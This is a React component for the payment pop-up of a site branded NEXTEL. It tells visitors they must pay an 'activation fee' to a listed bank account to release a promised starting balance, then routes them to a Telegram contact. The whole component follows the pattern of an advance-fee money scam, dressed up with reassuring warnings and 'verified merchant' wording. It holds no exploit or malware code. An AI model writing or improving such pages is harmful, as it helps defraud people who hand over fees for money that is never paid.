import { NEXTEL_THEME } from "../styles/themeTokens";
import { VELORA_CONFIG } from "../config/constants";
import { formatNaira } from "../utils/formatters";
import { buildActivationMessageParam } from "../utils/stringHelpers";

/**
 * Layer 9: Components - Hardened Verification Checkout Gate overlay.
 * Enforces security warnings and maps specific target transaction details dynamically.
 * Emits click handshakes straight out to configured external channels.
 * 
 * @param {Object} props
 * @param {Object} props.chosenPackage - Active metadata object from user context track profiles.
 * @param {function} props.onClose - Action callback handler designed to collapse view layers.
 */
export default function PaymentModal({ chosenPackage, onClose }) {
  if (!chosenPackage) return null;

  const { modalOverlay, surfaceCard } = NEXTEL_THEME.layouts;
  const { textMint, textSecondary, bgMint } = NEXTEL_THEME.colors;
  const { MERCHANT, TELEGRAM_ACTIVATION_LINK } = VELORA_CONFIG;

  const formattedPrice = formatNaira(chosenPackage.price);
  const textMessageParam = buildActivationMessageParam(chosenPackage.name, formattedPrice);
  const computedExternalRedirectUrl = `${TELEGRAM_ACTIVATION_LINK}?text=${textMessageParam}`;

  return (
    <div className={modalOverlay}>
      <div className={`${surfaceCard} w-full max-w-md border-2 border-amber-500/20 p-6 md:p-8 space-y-6 rounded-2xl shadow-2xl animate-fade-in-up glow-card-gold`}>
        
        {/* Structural Header Alerts */}
        <div className="space-y-1">
          <h3 className="text-lg font-black tracking-tight text-amber-400 flex items-center gap-2">
            ⚠️ Account Activation Required
          </h3>
          <p className={`${textSecondary} text-xs leading-relaxed`}>
            To release your initial starting package balance of <span className={`${textMint} font-black`}>{formatNaira(chosenPackage.startingBalance)}</span>, you must clear deployment processing fees.
          </p>
        </div>

        {/* Clear Financial Operational Matrix Ledger */}
        <div className="bg-[#020F0A] border border-emerald-950/60 rounded-xl p-4 md:p-5 space-y-4 text-xs leading-relaxed">
          <p className="text-white font-bold">
            Make a payment to one of Our Verified Merchant accounts below:
          </p>

          {/* Opay Anti-Fraud Compliance Notice Shield */}
          <div className="bg-amber-500/10 border border-amber-500/20 rounded-lg p-3 text-amber-300/90 text-[11px] font-semibold tracking-wide">
            NOTE ⚠️: {MERCHANT.RESTRICTION_WARN}
          </div>

          {/* Dynamic Required Fee Ledger Pinpoint */}
          <div className="bg-emerald-950/30 border border-emerald-900/30 py-3 rounded-lg text-center font-bold">
            <span className={`${textSecondary} block text-[10px] uppercase font-mono tracking-wider mb-0.5`}>
              Required Activation Fee
            </span>
            <span className={`${textMint} text-xl font-black`}>
              {formattedPrice}
            </span>
          </div>

          {/* Hardened Merchant Parameters */}
          <div className="space-y-2 border-t border-emerald-950/80 pt-3 text-slate-300 font-mono text-[11px] md:text-xs">
            <div className="flex justify-between"><span className={textSecondary}>Bank Name:</span><span className="text-white font-bold">{MERCHANT.BANK_NAME}</span></div>
            <div className="flex justify-between"><span className={textSecondary}>Account Name:</span><span className="text-white font-bold">{MERCHANT.ACCOUNT_NAME}</span></div>
            <div className="flex justify-between"><span className={textSecondary}>Account Number:</span><span className={`${textMint} font-black text-sm tracking-wider`}>{MERCHANT.ACCOUNT_NUMBER}</span></div>
          </div>

          <p className={`${textSecondary} italic text-center text-[10px] pt-1 block`}>
            Let's make money together on NEXTEL. Congratulations in advance 👏 ☺️
          </p>
        </div>

        {/* Dynamic Action Trigger Anchors */}
        <div className="space-y-2.5">
          <a
            href={computedExternalRedirectUrl}
            target="_blank"
            rel="noopener noreferrer"
            className={`${bgMint} block w-full text-center py-3.5 rounded-xl font-black text-xs md:text-sm tracking-wide uppercase transition-all duration-200 transform active:scale-[0.97] shadow-lg`}
          >
            I've made my payment
          </a>
          <button
            type="button"
            onClick={onClose}
            className={`${textSecondary} hover:text-white block w-full text-center text-xs font-mono uppercase tracking-wider transition-colors duration-150 pt-1`}
          >
            Close Window
          </button>
        </div>

      </div>
    </div>
  );
}

